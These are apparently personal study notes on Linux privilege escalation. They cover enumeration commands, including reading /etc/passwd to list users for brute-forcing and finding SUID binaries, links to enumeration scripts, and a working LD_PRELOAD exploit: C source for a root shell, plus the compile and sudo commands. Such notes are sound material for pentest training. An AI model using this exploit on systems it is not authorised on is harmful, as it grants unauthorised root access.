# Enumeration
## Linux
**Commands:** \
`whoami` - gives the current user \
`hostname` - hostname of target machine \
`uname -a` - prints system information like OS and kernel version, hostname, system time, arch ... \
`ps` - show processes, `-a` or `-e` show all processes, `-axjf` shwo process tree \
`env` - show envirinment variables \
`sudo -l` - show what commands can be run as root with sudo \
`id` -shows user privileges and groups 

**Files** \
`/proc/version` - proc file system (procfs) gives more info about the kernel and istalled tool like compilers \
`/etc/issue` - system file, contains info about the OS \
`/etc/passwd` - shows users and other info, in this context we are only interested in the users \
`cat /etc/passwd | cut -d ":" -f 1` - cuts out only the users in passwd, can be used for brute force attacks

**Network** \
`ifconfig` \
`ip toute` \
`netstat` - shows info about existing communications \
>`-a` - shows all listening ports and established comms \
>`-at` / `-au` - lists TCP reso. UDP \
>`-l` - list ports in listening mode \
>`-s` - shows usage statistics by protocol, can be combiled with spesific protocol filters \
>`-p` - shows connections with service name and PID info, can also be combined with specific protocols \
>`-i` - shows interface statistics

**find** \
see [find](https://github.com/leeky-mem/linux-notes/blob/main/commands.md) for basics. For privilege escalation searching for specific permissions is important. \
`-perm mode` - mode can be u,g,o(i.e user,goup,other). In this mode permission bits must match exactly. `-perm o=w` matches onls file which have mode 0020. \
`-perm -mode` - matches all files wich have mode, but not exclusivly. \  
`find / -perm -u=s -type f 2>/dev/null` - find files with SUID bit set. SUID bit allows to run the file with the privilege level of the owner.

## Automated Enumeration
[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - scrip .sh \
[LinEnum](https://github.com/rebootuser/LinEnum) - script .sh \
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester) - script .sh \
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) - script .sh \
[Linux Priv Checker](https://github.com/linted/linuxprivchecker) - script python or .sh

# Sudo
[GTFOBins](https://gtfobins.github.io/) a list of commands and binaries which can be abused to elevate privileges. \
`sudo -l` - show which commands the current user can use with sudo

## Abusing LD_PRELOAD
The `LD_PPRELOAD` environment option can be abused to spawn root shell with programs that can be executed with sudo.

The steps of this privilege escalation vector can be summarized as follows:

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
Compile as a shared library: \
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Run a program we can as root: \
`sudo LD_PRELOAD=/path/to/shell.so <sudoable program>`



